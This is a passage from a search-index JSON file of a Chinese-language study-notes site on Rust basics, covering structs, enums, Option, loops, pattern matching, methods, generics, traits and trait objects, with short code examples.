\u6240\u6709\u6743\u5e76\u6ca1\u6709\u8f6c\u79fb\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528</p>"},{"location":"cs/pl/rust/basic/#_29","title":"\u5143\u7ec4\u7ed3\u6784\u4f53","text":"<p>\u53ef\u4ee5\u5b9a\u4e49\u50cf\u5143\u7ec4\u4e00\u6837\u6ca1\u6709\u5b57\u6bb5\u540d\u7684\u7ed3\u6784\u4f53\uff1a <pre><code>struct Point(i32, i32, i32);\nlet point = Point(0, 0, 0);\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_30","title":"\u5355\u5143\u7ed3\u6784\u4f53","text":"<p>\u50cf\u5355\u5143\u7c7b\u578b\u4e00\u6837\uff0c\u6ca1\u6709\u4efb\u4f55\u5b57\u6bb5\u548c\u5c5e\u6027\u7684\u7ed3\u6784\u4f53\u3002\u4f5c\u7528\u4e0a\u6765\u770b\u5c31\u662f\u4e0d\u5173\u5fc3\u6570\u636e\uff0c\u4f46\u5173\u5fc3\u884c\u4e3a\uff08\u540e\u9762 impl \u4e4b\u7c7b\u7684\uff09 <pre><code>struct UnitLikeStruct;\nlet a = UnitLikeStruct;\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_31","title":"\u6253\u5370\u7ed3\u6784\u4f53","text":"<p>\u7ed3\u6784\u4f53\u4e0d\u80fd\u76f4\u63a5\u88ab\u653e\u5728 {} \u4e2d\u6253\u5370\uff0c\u56e0\u4e3a\u6ca1\u6709\u5b9e\u73b0 Display trait</p> <p>\u4e00\u79cd\u65b9\u4fbf\u7684\u8f93\u51fa\u65b9\u5f0f\u662f\u5229\u7528 <code>#[derive(Debug)]</code> \u6765\u81ea\u52a8\u5b9e\u73b0 Debug trait \u6765\u5229\u7528 {:?} \u683c\u5f0f\u5316\u6216 dbg! \u5b8f\u8fdb\u884c debug \u6253\u5370\uff1a <pre><code>#[derive(Debug)]\nstruct Rectangle {\n    width: u32,\n    height: u32,\n}\n\nfn main() {\n    let rect = Rectangle { width: 30, height: 50 };\n    println!(\"{:?}\", rect);\n    dbg!(rect); // \u8f93\u51fa\u5230 stderr \u6d41\u4e2d\n}\n</code></pre> \u8f93\u51fa\u4e3a\uff1a <pre><code>Rectangle { width: 30, height: 50 }\n[src/main.rs:10] rect = Rectangle {\n    width: 30,\n    height: 50,\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_32","title":"\u679a\u4e3e","text":"<p>\u4f7f\u7528 enum \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u679a\u4e3e\u7c7b\u578b\uff0c\u7528 :: \u6765\u8bbf\u95ee\u6210\u5458\uff0c\u53ef\u4ee5\u5305\u542b\u503c\uff1a <pre><code>enum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n    ChangeColor(i32, i32, i32),\n}\n\nfn main() {\n    let m1 = Message::Quit;\n    let m2 = Message::Move{ x: 1, y: 1 };\n    let m3 = Message::ChangeColor(255, 255, 0);\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#option","title":"Option","text":"<p>\u7c7b\u4f3c Haskell \u4e2d\u7684 Maybe\uff0c\u5b9a\u4e49\u662f\uff1a <pre><code>enum Option&lt;T&gt; {\n    Some(T),\n    None,\n}\n</code></pre> \u4f7f\u7528\u65f6\u65e0\u9700\u6dfb\u52a0 Option:: \u524d\u7f00\uff0c\u63d0\u53d6\u503c\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d</p>"},{"location":"cs/pl/rust/basic/#_33","title":"\u6570\u7ec4","text":"<ul> <li>rust \u4e2d\u6570\u7ec4\u957f\u5ea6\u56fa\u5b9a\uff0c\u5fc5\u987b\u6709\u76f8\u540c\u7c7b\u578b\uff0c\u5b58\u50a8\u7ebf\u6027\u6392\u5217\u5728\u6808\u4e0a\uff0c\u901f\u5ea6\u5feb</li> <li>\u4e00\u4e2a\u6570\u7ec4\u7684\u7c7b\u578b\u662f [\u5143\u7d20\u7c7b\u578b; \u5143\u7d20\u4e2a\u6570]\uff0c\u4f8b\u5982 <code>[i32; 5]</code> \u8868\u793a\u5305\u542b 5 \u4e2a i32 \u7684\u6570\u7ec4</li> <li>\u4f7f\u7528\u540c\u4e00\u4e2a\u91cd\u590d\u5143\u7d20\u521d\u59cb\u5316\u6570\u7ec4\uff0c\u4f8b <code>let a = [3; 5]</code> \u5373 a \u4e3a\u5305\u542b 5 \u4e2a 3 \u7684\u6570\u7ec4</li> <li>\u7d22\u5f15\u4f7f\u7528 []\uff0c\u4e0e\u5176\u5b83\u8bed\u8a00\u76f8\u540c</li> <li>\u8d8a\u754c\u8bbf\u95ee\u4f1a\u89e6\u53d1 panic</li> <li>\u548c\u5b57\u7b26\u4e32\u4e00\u6837\u53ef\u4ee5\u521b\u5efa\u5207\u7247\u5f15\u7528</li> </ul>"},{"location":"cs/pl/rust/basic/#_34","title":"\u6d41\u7a0b\u63a7\u5236","text":""},{"location":"cs/pl/rust/basic/#_35","title":"\u5206\u652f","text":"<ul> <li>if - else if - else \u7ed3\u6784</li> <li>\u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7</li> <li>if \u8bed\u53e5\u5757\u662f\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u8d4b\u503c</li> </ul>"},{"location":"cs/pl/rust/basic/#_36","title":"\u5faa\u73af","text":"<ul> <li>for \u5faa\u73af<ul> <li>for ... in ... \u7ed3\u6784</li> <li>in \u540e\u9762\u7684\u96c6\u5408\u4e00\u822c\u9700\u8981\u4f7f\u7528\u5f15\u7528\uff0c\u5426\u5219\u4f1a\u5c06\u6240\u6709\u6743\u79fb\u81f3 for \u5757\u5185\uff08\u5b9e\u73b0\u4e86 Copy trait \u7684\u9664\u5916\uff09</li> <li>\u5faa\u73af\u4e2d\u4fee\u6539\u5143\u7d20\u7684\u8bdd\u4e00\u822c\u9700\u8981\u4f7f\u7528\u53ef\u53d8\u5f15\u7528</li> <li>\u5e26\u7d22\u5f15\u5faa\u73af     <pre><code>let a = [4, 3, 2, 1];\nfor (i, v) in a.iter().enumerate() {\n    // ...\n}\n</code></pre></li> <li>\u4ec5\u5faa\u73af\u591a\u5c11\u6b21\uff1a<code>for _ in 0..10</code> \u5faa\u73af 10 \u6b21</li> <li>\u53ef\u4ee5\u4f7f\u7528 continue \u548c break \u63a7\u5236\u5faa\u73af</li> </ul> </li> <li>while \u5faa\u73af<ul> <li>\u6ca1\u4ec0\u4e48\u7279\u522b\u7684</li> </ul> </li> <li>loop \u5faa\u73af<ul> <li>\u4e0d\u4f1a\u81ea\u52a8\u505c\u6b62\uff0c\u9700\u8981\u9760 break</li> <li>\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528 break \u6765\u8fd4\u56de\u4e00\u4e2a\u503c     <pre><code>let result = loop {\n    cnt += 1;\n    if cnt == 10 {\n        break cnt * 2;\n    }\n};\n</code></pre></li> </ul> </li> </ul> <p>rust \u4e2d\u53ef\u4ee5\u4f7f\u7528 label \u6765\u6307\u5b9a\u591a\u91cd\u5faa\u73af\u4e2d break \u6216 continue \u54ea\u4e00\u5c42\u5faa\u73af\uff1a <pre><code>'outer: for i in 0..10 {\n    println!(\"Outer: #i = {}\", i);\n    'inner: for j in 0..10 {\n        println!(\"Inner: #j = {}\", j);\n        if j == i { continue 'outer; }\n        if i == 5 { break 'outer; }\n        if j != 0 { continue 'inner; }\n        println!(\"...\");\n    }\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_37","title":"\u6a21\u5f0f\u5339\u914d","text":"<p>rust \u4e2d\u6709\u5f88\u591a\u6a21\u5f0f\u5339\u914d\uff0c\u6bd4\u5982 let \u8bed\u53e5\u3001for \u5faa\u73af\u672c\u8eab\u5c31\u76f8\u5f53\u4e8e\u6a21\u5f0f\u5339\u914d\uff1a <pre><code>let (x, y) = (1, 2);\nfor (index, value) in v.iter().enumerate() { /* ... */ }\n</code></pre> \u4ee5\u53ca\u51fd\u6570\u53c2\u6570\uff1a <pre><code>fn func(&amp;(x, y): &amp;(i32, i32)) {\n    // x \u548c y \u4f1a\u4ece\u8fd9\u4e00\u4e2a\u53c2\u6570\u4e2d\u5339\u914d\u51fa\u6765\n}\n</code></pre> \u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e9b\u4e13\u95e8\u5229\u7528\u6a21\u5f0f\u5339\u914d\u7684\u8bed\u6cd5\uff1a</p>"},{"location":"cs/pl/rust/basic/#match","title":"match \u8bed\u53e5","text":"<p>\u7c7b\u4f3c python \u7684 match-case \u8bed\u53e5\uff0c\u4ee5\u53ca Haskell \u7684\u6a21\u5f0f\u5339\u914d\u4ee5\u53ca\u5b88\u536b\u8bed\u6cd5 <pre><code>match target {\n    pattern1 =&gt; expression1,\n    pattern2 =&gt; {\n        statements1;\n        statements2;\n        expression2\n    },\n    pattern3 | pattern4 =&gt; expression3,\n    _ =&gt; expression4,\n}\n</code></pre></p> <ul> <li>\u6574\u4e2a match \u8bed\u53e5\u5757\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f</li> <li>match \u5fc5\u987b\u7a77\u4e3e\u51fa\u6240\u6709\u6a21\u5f0f\uff0c\u672a\u5217\u51fa\u7684\u5269\u4f59\u90e8\u5206\u4f7f\u7528\u901a\u914d\u7b26 _ \u8868\u793a\u5176\u5b83\u6240\u6709\u53ef\u80fd\u6027<ul> <li>_ \u4e0d\u4f1a\u88ab\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\uff0c\u5176\u5339\u914d\u5230\u7684\u503c\u90fd\u4f1a\u88ab\u5ffd\u7565</li> </ul> </li> <li>match \u7684\u6bcf\u4e00\u4e2a\u5206\u652f\u90fd\u5fc5\u987b\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u4e14\u6240\u6709\u5206\u652f\u7684\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u7c7b\u578b\u9700\u8981\u76f8\u540c</li> <li>| \u8868\u793a\u6216\uff0c\u5373\u5339\u914d\u4e8c\u8005\u4e2d\u7684\u4e00\u4e2a\u5373\u53ef</li> <li>\u53ef\u4ee5\u5229\u7528\u6a21\u5f0f\u5339\u914d\u6765\u7ed1\u5b9a\u65b0\u53d8\u91cf</li> <li>\u5e8f\u5217\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u6a21\u5f0f\uff0c\u6bd4\u5982 x = 5 \u5c31\u53ef\u4ee5\u5339\u914d\u6a21\u5f0f 1..=5</li> <li>\u53ef\u4ee5\u4f7f\u7528 .. \u6765\u5ffd\u7565\u5269\u4f59\u503c     <pre><code>let origin = Point { x: 0, y: 0, z: 0 };\nmatch origin {\n    Point { x, .. } =&gt; println!(\"x is {}\", x),\n}\nlet numbers = (2, 4, 8, 16, 32);\nmatch numbers {\n    (first, .., last) =&gt; println!(\"Some numbers: {}, {}\", first, last),\n}\n</code></pre></li> <li>\u53ef\u4ee5\u5728\u6a21\u5f0f\u540e\u9762\u589e\u52a0\u989d\u5916\u7684 if \u6761\u4ef6\uff0c\u79f0\u4e3a\u5339\u914d\u5b88\u536b\uff08match guard\uff09     <pre><code>let num = Some(4);\nmatch num {\n    Some(x) if x &gt;= 0 &amp; x &lt; 5 =&gt; println!(\"less than five: {}\", x),\n    Some(x) =&gt; println!(\"{}\", x),\n    None =&gt; (),\n}\n</code></pre><ul> <li>\u5728\u6709 | \u7684\u60c5\u51b5\u4e0b\uff0cif \u8bed\u53e5\u7684\u6761\u4ef6\u4f1a\u4f5c\u7528\u4e8e\u6240\u6709\u7684\u6a21\u5f0f\uff0c\u800c\u4e0d\u662f\u6700\u540e\u4e00\u4e2a</li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 @ \u6765\u4e3a\u5b57\u6bb5\u7ed1\u5b9a\u53d8\u91cf\uff0c\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u91cc\u7b2c\u4e00\u4e2a\u5339\u914d\u53ef\u4ee5\u5199\u4e3a <code>Some(x @ 0..5)</code><ul> <li>Rust 1.53 \u65b0\u8bed\u6cd5\uff1a\u5982 <code>num @ (1 | 2) =&gt; ...</code> \u5c06 1 \u6216 2 \u7ed1\u5b9a\u5230 num \u53d8\u91cf\u4e0a</li> <li>Rust 1.56 \u65b0\u8bed\u6cd5\uff1a\u548c Haskell \u4e2d @ \u7528\u6cd5\u7c7b\u4f3c\uff0c\u5728\u89e3\u6784\u7684\u540c\u65f6\u4fdd\u7559\u539f\u503c\uff0c\u5982     <pre><code>let p @ Point {x: px, y: py} = Point {x: 10, y: 20};\n// p = Point {x: 10, y: 20}, px = 10, py = 20\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#if-let-while-let","title":"if let / while let","text":"<p>\u53ea\u9700\u8981\u5339\u914d\u4e00\u4e2a\u6a21\u5f0f\u3001\u5ffd\u7565\u5176\u5b83\u6a21\u5f0f\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 if let \u8bed\u53e5\u6765\u7b80\u5316\uff0c\u6bd4\u5982\u4e0b\u9762\u4ee3\u7801 <pre><code>let v = Some(1);\nmatch v {\n    Some(1) =&gt; println!(\"!\"),\n    _ =&gt; (),\n}\n</code></pre> \u53ef\u4ee5\u5199\u4e3a <pre><code>let v = Some(1);\nif let Some(1) = v { // \u662f\u4e00\u4e2a\u7b49\u53f7\uff0c\u4e0d\u662f\u53cc\u7b49\u53f7\n    println!(\"!\");\n}\n</code></pre> \u4e0e\u4e4b\u76f8\u4f3c\u7684\u662f while let \u8bed\u53e5\uff0c\u53ea\u8981\u5339\u914d\u5c31\u4e00\u76f4\u8fdb\u884c\u5faa\u73af\uff0c\u4f8b\u5982\uff1a <pre><code>let mut stack = Vec::new();\n// ...\nwhile let Some(top) = stack.pop() {\n    println!(\"pop {}\", top);\n}\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#matches","title":"matches! \u5b8f","text":"<p>\u4ec5\u4ec5\u9700\u8981\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u548c\u4e00\u4e2a\u6a21\u5f0f\u5339\u914d\u7684\u8bdd\u53ef\u4ee5\u4f7f\u7528 matches! \u5b8f\uff1a <pre><code>matches!(value, pattern)\n</code></pre> \u5982\u679c\u5339\u914d\u5219\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false</p>"},{"location":"cs/pl/rust/basic/#_38","title":"\u65b9\u6cd5","text":"<p>Rust \u4e2d\u4f7f\u7528 impl \u5757\u6765\u4e3a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f53\u4f5c\uff0cstruct \u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u5c5e\u6027\uff0cimpl \u5757\u4e2d\u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u65b9\u6cd5 <pre><code>impl StructName {\n    fn new(...) -&gt; StructName {\n        StructName {\n            ...\n        }\n    }\n    fn method(&amp;self, ...) -&gt; ... {\n        ...\n    }\n}\n</code></pre></p> <ul> <li>\u4e00\u4e2a\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a self \u7b49\uff0c\u8868\u793a\u81ea\u8eab\uff0c\u4e14\u670d\u4ece\u6240\u6709\u6743\u89c4\u5219<ul> <li>self\uff1a\u5c06\u8c03\u7528\u8005\u7684\u6240\u6709\u6743\u8f6c\u79fb\u5230\u65b9\u6cd5\u4e2d\uff0c\u5c11\u7528\uff08\u7c7b\u578b\u4e3a <code>Self</code>\uff0c\u8868\u793a\u7ed3\u6784\u4f53\u81ea\u8eab\u7c7b\u578b\uff09</li> <li>&amp;self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528\uff08\u5b9e\u9645\u4e0a\u662f <code>self: &amp;Self</code> \u7684\u8bed\u6cd5\u7cd6\uff09</li> <li>&amp;mut self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528</li> </ul> </li> <li>\u65b9\u6cd5\u540d\u53ef\u4ee5\u4e0e\u5b57\u6bb5\u540d\u76f8\u540c\uff08\u4e00\u822c\u7528\u6765\u5b9e\u73b0 getter\uff09</li> <li>rust \u4f1a\u4e3a &amp;self \u7b49\u81ea\u52a8\u5f15\u7528\u4e0e\u89e3\u5f15\u7528</li> <li>impl \u5757\u4e2d\u6ca1\u6709 self \u53c2\u6570\u7684\u51fd\u6570\u79f0\u4e3a\u5173\u8054\u51fd\u6570\uff08\u5982\u4e0a\u9762\u7684 new\uff09<ul> <li>\u4e0d\u80fd\u4f7f\u7528 . \u6765\u4ee5\u65b9\u6cd5\u7684\u5f62\u5f0f\u8c03\u7528</li> <li>\u5e94\u8be5\u4f7f\u7528 :: \u6765\u8c03\u7528\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u8fd9\u4e2a\u7ed3\u6784\u4f53\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u51fd\u6570\uff09</li> <li>new \u4e00\u822c\u7528\u6765\u4f5c\u4e3a\u6784\u9020\u5668\uff0c\u5373\u4ece\u53c2\u6570\u8fd4\u56de\u4e00\u4e2a\u7ed3\u6784\u4f53</li> </ul> </li> <li>\u53ef\u4ee5\u5728\u591a\u4e2a impl \u5757\u4e2d\u4e3a\u540c\u4e00\u4e2a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5</li> <li>impl \u4e5f\u53ef\u4ee5\u4e3a\u679a\u4e3e\u7c7b\u578b\u5b9a\u4e49\u65b9\u6cd5</li> </ul>"},{"location":"cs/pl/rust/basic/#generics","title":"\u6cdb\u578b Generics","text":"<pre><code>fn add&lt;T: std::ops::Add&lt;Output = T&gt;&gt;(a: T, b: T) -&gt; T {\n    a + b         // ^ \u4fdd\u8bc1\u53ef\u4ee5 T \u76f8\u52a0\u5e76\u5f97\u5230 T \u7c7b\u578b\u7684\u7ed3\u679c\n}\n</code></pre> <ul> <li><code>&lt;T&gt;</code> \u4e3a\u4e00\u4e2a\u51fd\u6570\u89c4\u5b9a\u4e00\u4e2a\u6cdb\u578b T\uff0c\u5192\u53f7\u540e\u9762\u63a5\u9700\u8981\u7684 trait \u6765\u6dfb\u52a0\u9650\u5236</li> <li>\u53ef\u4ee5\u901a\u8bc6\u5b9a\u4e49\u591a\u4e2a\u6cdb\u578b\uff0c\u7528\u9017\u53f7\u9694\u5f00\u5373\u53ef</li> <li>\u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u7b49\u90fd\u53ef\u4ee5\u4f7f\u7528\u6cdb\u578b     <pre><code>struct Point&lt;T&gt; {\n    x: T,\n    y: T,\n}\nimpl&lt;T&gt; Point&lt;T&gt; {\n    //... \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 T\n}\nenum Option&lt;T&gt; {\n    Some(T),\n    None,\n}\n</code></pre></li> <li>\u53ef\u4ee5\u4e3a\u5e26\u6cdb\u578b\u7684\u7ed3\u6784\u4f53\u9488\u5bf9\u67d0\u4e00\u5177\u4f53\u7c7b\u578b\u5b9e\u73b0\u65b9\u6cd5\uff1a     <pre><code>impl Point&lt;f32&gt; {\n    // only for Point&lt;f32&gt;\n}\n</code></pre></li> <li>\u8c03\u7528\u6cdb\u578b\u51fd\u6570     <pre><code>struct SGen&lt;T&gt;(T);\nfn func&lt;T&gt;(arg: SGen&lt;T&gt;) { /* ... */}\nfn main() {\n    func(SGen('a'));         // \u9690\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char\n    func::&lt;char&gt;(SGen('a')); // \u663e\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char\n}\n</code></pre></li> <li>const \u6cdb\u578b\uff0c\u5b9a\u4e49\u4e00\u4e2a\u57fa\u4e8e\u503c\u7684\u6cdb\u578b\u53c2\u6570     <pre><code>fn func&lt;T: ..., const N: usize&gt;(arr: [T; N]) {\n    // ...\n}\n</code></pre><ul> <li>const \u6cdb\u578b\u53c2\u6570\u53ea\u80fd\u63a5\u53d7\u4e0d\u5e26\u5176\u5b83\u6cdb\u578b\u53c2\u6570\u7684\u5b9e\u53c2</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#trait","title":"\u7279\u5f81 Trait","text":"<p>\u7279\u5f81\u7c7b\u4f3c\u4e8e python \u4e2d\u7684\u62bd\u8c61\u57fa\u7c7b\uff0c\u89c4\u5b9a\u4e00\u4e9b\u5fc5\u987b\u6709\u7684\u65b9\u6cd5\uff0c\u4f46\u5dee\u522b\u8fd8\u662f\u5f88\u5927</p> <ul> <li>\u5b9a\u4e49 trait     <pre><code>pub trait MyTrait {\n    fn func1(&amp;self) -&gt; ...; // \u5206\u53f7\u7ed3\u5c3e\uff0c\u4e0d\u7528\u5199\u51fd\u6570\u5185\u5bb9\n    fn func2(&amp;self) -&gt; ... {\n        ... // \u63d0\u4f9b\u9ed8\u8ba4\u5b9e\u73b0\n    }\n}\n</code></pre><ul> <li>pub \u5173\u952e\u5b57\u4f7f\u4e4b\u53ef\u4ee5\u4ece\u5916\u90e8\u5bfc\u5165</li> <li>trait \u5757\u4e2d\u5bf9\u4e8e\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\u53ef\u4ee5\u53ea\u5199\u7b7e\u540d\uff0c\u4e5f\u53ef\u4ee5\u5c06\u51fd\u6570\u5199\u5b8c\u6574\u6765\u63d0\u4f9b\u4e00\u4e2a\u9ed8\u8ba4\u5b9e\u73b0</li> </ul> </li> <li>\u4e3a\u7c7b\u578b\u5b9e\u73b0\u7279\u5f81     <pre><code>impl MyTrait for MyType {\n    fn func1(&amp;self) -&gt; ... {\n        ...\n    }\n}\n</code></pre><ul> <li>\u5b64\u513f\u89c4\u5219\uff1a\u4e3a A \u7c7b\u578b\u5b9e\u73b0\u7279\u5f81 T\uff0c\u5219 A \u548c T \u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\uff0c\u4f8b\u5982\u4e0d\u53ef\u4ee5\u4e3a\u6807\u51c6\u5e93\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0\u5176\u5b83\u6807\u51c6\u5e93\u4e2d\u7684\u7279\u5f81\u3002\u786e\u4fdd\u67d0\u4e00\u5e93\u4e2d\u7684\u4ee3\u7801\u4e0d\u4f1a\u88ab\u5728\u88ab\u4f7f\u7528\u7684\u65f6\u5019\u7834\u574f</li> <li>\u5982\u679c\u4e00\u4e2a\u7279\u5f81\u7684\u65b9\u6cd5\u90fd\u6709\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5219\u82b1\u62ec\u53f7\u5185\u53ef\u4ee5\u4e0d\u5199\u4efb\u4f55\u4e1c\u897f</li> </ul> </li> <li>\u7279\u5f81\u7ea6\u675f<ul> <li>\u53c2\u6570\u91cc\u76f4\u63a5\u5199\u7279\u5f81\u662f\u6cdb\u578b\u7684\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4ee5\u4e0b\u4e24\u884c\u4ee3\u7801\u6548\u679c\u4e00\u6837     <pre><code>pub fn func(arg: &amp;impl MyTrait) {}\npub fn func&lt;T: MyTrait&gt;(arg: &amp;T) {}\n</code></pre></li> <li>\u53c2\u6570\u91cc\u6709\u7279\u5f81\u65f6\u4e0d\u4f1a\u5f3a\u5236\u6240\u6709\u8fd9\u6837\u7684\u53c2\u6570\u4e3a\u540c\u4e00\u7c7b\u578b\uff0c\u6bd4\u5982\u4ee5\u4e0b\u4e09\u884c\u4ee3\u7801 1 \u548c 2 \u7b49\u4ef7\u3001\u548c 3 \u4e0d\u7b49\u4ef7     <pre><code>pub fn func(a: &amp;impl MyTrait, b: &amp;impl MyTrait) {}\npub fn func&lt;T: MyTrait, U: MyTrait&gt;(a: &amp;T, b: &amp;U) {}\npub fn func&lt;T: MyTrait&gt;(a: &amp;T, b: &amp;T) {}\n</code></pre></li> <li>\u591a\u91cd\u7ea6\u675f     <pre><code>pub fn func(arg: &amp;(impl Trait1 + Trait2)) {}\npub fn func&lt;T: Trait1 + Trait2&gt;(arg: &amp;T) {}\n</code></pre></li> <li>where \u7ea6\u675f     <pre><code>pub fn func&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; ...\n    where T: Trait1 + Trait2 + Trait3,\n          U: Trait4 + Trait5 + Trait6\n{}\n</code></pre></li> <li>\u51fd\u6570\u8fd4\u56de\u503c\u53ef\u4ee5\u53ea\u8bf4\u5b9e\u73b0\u4e86\u67d0\u4e2a\u7279\u5f81\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u660e\u786e\u89c4\u5b9a     <pre><code>fn func() -&gt; impl MyTrait {}\n</code></pre></li> </ul> </li> <li>derive \u53ef\u4ee5\u6d3e\u751f\u7279\u5f81\uff0c\u4f7f\u7528\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5982\u524d\u9762\u5199\u8fc7\u7684 <code>#[derive(Debug)]</code><ul> <li>Debug\u3001PartialEq\u3001Eq\u3001PartialOrd\u3001Ord\u3001Clone\u3001Copy\u3001Hash\u3001Default</li> <li>\u591a\u4e2a\u7684\u8bdd\u4e2d\u95f4\u9017\u53f7\u5206\u9694</li> </ul> </li> <li>\u8c03\u7528\u5b9e\u73b0\u4e86\u67d0\u4e00\u7279\u5f81\u7684\u7c7b\u578b\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u5148\u7528 use \u5c06\u7279\u5f81\u5f15\u5165</li> <li>\u4f8b\u5b50<ul> <li>\u4e3a Point \u5b9e\u73b0\u52a0\u6cd5     <pre><code>use std::ops::Add;\n#[derive(Debug)]\nstruct Point&lt;T: Add&lt;T, Output = T&gt;&gt; {\n    x: T,\n    y: T,\n}\nimpl&lt;T: Add&lt;T, Output = T&gt;&gt; Add for Point&lt;T&gt; {\n    type Output = Point&lt;T&gt;; // \u5173\u8054\u7c7b\u578b\n    fn add(self, p: Point&lt;T&gt;) -&gt; Point&lt;T&gt; {\n        Point {\n            x: self.x + p.x,\n            y: self.y + p.y,\n        }\n    }\n}\n</code></pre></li> <li>\u4e3a Point \u5b9e\u73b0\u683c\u5f0f\u5316\u8f93\u51fa     <pre><code>use std::fmt;\nuse std::fmt::Display;\nimpl Display for Point {\n    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {\n        write!(f, \"({}, {})\", self.x, self.y)\n    }\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_39","title":"\u7279\u5f81\u5bf9\u8c61","text":"<p>\u6bd4\u5982\u4f7f\u7528\u4e00\u4e2a Vec \u6765\u5b58\u50a8\u5b9e\u73b0\u540c\u4e00\u4e2a\u7279\u5f81\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u7528\u5230\u7279\u5f81\u5bf9\u8c61\uff0c\u4f8b\u5982 <code>Vec&lt;Box&lt;dyn MyTrait&gt;&gt;</code></p> <ul> <li>\u4f7f\u7528\u6cdb\u578b\u6765\u4ee3\u66ff\u7684\u8bdd\uff0cVec \u4e2d\u7684\u6240\u6709\u503c\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4</li> <li>\u53ea\u80fd\u4f7f\u7528 &amp; \u5f15\u7528\u6216\u8005\u4f7f\u7528 Box \u667a\u80fd\u6307\u9488\u6765\u521b\u5efa\u7279\u5f81\u5bf9\u8c61<ul> <li><code>&amp;dyn MyTrait</code> \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u7528 &amp; \u501f\u7528</li> <li><code>Box&lt;dyn MyTrait&gt;</code> \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u901a\u8fc7 Box::new(...) \u6765\u57fa\u4e8e\u67d0\u4e2a\u503c\u521b\u5efa\u667a\u80fd\u6307\u9488</li> <li>\u521b\u5efa\u7684\u65f6\u5019\u4e0d\u9700\u8981\u52a0 dyn</li> <li>\u4e0d\u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u8bdd\uff0c\u5927\u5c0f\u4f1a\u672a\u77e5\uff0c\u4f46 &amp;dyn \u548c Box&lt;dyn&gt;  \u5927\u5c0f\u90fd\u5df2\u77e5</li> <li>dyn \u4ee3\u8868\u52a8\u6001\u5206\u53d1\uff08dynamic dispatch\uff09</li> </ul> </li> <li>\u7279\u5f81\u5bf9\u8c61\u7684\u9650\u5236\uff1a\u53ea\u6709\u5bf9\u8c61\u5b89\u5168\u7684\u7279\u5f81\u624d\u80fd\u521b\u5efa\u7279\u5f81\u5bf9\u8c61<ul> <li>\u5bf9\u8c61\u5b89\u5168\uff1a<ul> <li>\u65b9\u6cd5\u7684\u8fd4\u56de\u7c7b\u578b\u4e0d\u80fd\u662f Self</li> <li>\u65b9\u6cd5\u6ca1\u6709\u4efb\u4f55\u6cdb\u578b\u53c2\u6570</li> </ul> </li> <li>Clone \u7279\u5f81\u7684 clone \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f Self\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u5bf9\u8c61\u5b89\u5168\u7684\u3002<code>Box&lt;dyn Clone&gt;</code> \u7684\u5199\u6cd5\u4f1a\u62a5\u9519</li> </ul> </li> 